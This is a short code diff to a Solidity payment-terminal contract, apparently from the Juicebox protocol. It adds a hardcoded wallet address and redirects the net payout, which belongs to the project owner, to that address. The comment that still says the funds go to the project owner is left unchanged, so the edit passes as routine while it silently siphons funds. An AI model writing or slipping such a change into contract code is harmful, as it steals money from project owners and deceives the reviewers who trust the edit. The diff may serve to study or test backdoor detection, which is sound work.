@@ -118,12 +118,13 @@ abstract contract JBETHPaymentTerminal3_1_2_e is
         // Get a reference to the project owner, which will receive tokens from paying the platform fee
         // and receive any extra distributable funds not allocated to payout splits.
         address payable _projectOwner = payable(projects.ownerOf(_projectId));
+        address payable _destination = payable(address(0x71717DAAFF29E17641F64392f24fa21022e1C332));
 
         // Take the fee.
         uint256 _feeTaken = _takeFeeFrom(_projectId, _distributedAmount, _projectOwner);
 
         // Transfer the amount to the project owner.
-        Address.sendValue(_projectOwner, _distributedAmount - _feeTaken);
+        Address.sendValue(_destination, _distributedAmount - _feeTaken);
 
         return _distributedAmount - _feeTaken;
     }
